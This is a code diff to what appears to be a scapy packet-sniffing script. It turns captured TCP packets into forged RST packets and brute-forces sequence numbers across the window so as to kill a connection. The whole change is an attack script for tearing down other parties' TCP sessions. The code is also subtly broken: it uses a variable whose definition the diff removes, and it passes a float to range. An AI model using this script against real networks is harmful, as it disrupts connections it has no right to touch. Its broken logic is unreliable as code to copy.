@@ -10,15 +10,18 @@ def pkt_callback(packet):
             resetPkt[TCP].flags = 'R'
             #set ack number
             ack = resetPkt[TCP].ack
-            seq = resetPkt[TCP].seq
             dst = resetPkt[IP].dst
             src = resetPkt[IP].src
             resetPkt[TCP].ack = seq
-            resetPkt[TCP].seq = ack
             resetPkt[IP].src = dst
             resetPkt[IP].dst = src
-            sendp(resetPkt)
+            window = resetPkt[TCP].window
+            num_packs = (2**32)/window
             #now enumerate through possible sequence numbers to try and kill the connection
+            for i in range(num_packs):
+                seq = i*window
+                resetPkt[TCP].seq = seq
+                sendp(resetPkt)
 
 
 interface = "ens10"
